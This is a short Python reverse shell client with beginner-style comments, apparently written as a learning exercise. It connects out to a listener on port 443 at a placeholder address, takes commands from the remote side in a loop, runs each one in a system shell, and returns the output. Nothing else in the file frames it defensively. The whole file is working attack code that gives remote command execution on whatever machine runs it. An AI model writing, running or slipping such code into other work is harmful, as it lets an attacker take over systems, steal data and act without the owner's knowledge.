import socket
import subprocess

# creating instantiated object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# connect method
s.connect(("0.0.0.0", 443))

# create while loop to make the connection stay open
# declare variable command
# receive a max of 4096 bytes and decode it as UTF-8
while True:
    command = s.recv(4096).decode('UTF-8')

    # debugging
    # print received command from server
    print("Command received: " + command)

    # command block
    
    # if the received command equals "exit" then close the socket
    if command == 'exit':
        s.close()
        # break terminates the script because it exits the loop
        break
    # else is optional but cleaner
    else:
        # create CMD variable
        # execute received command in a command shell
        # set stdout and stderr
        CMD = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        s.send(CMD.stdout)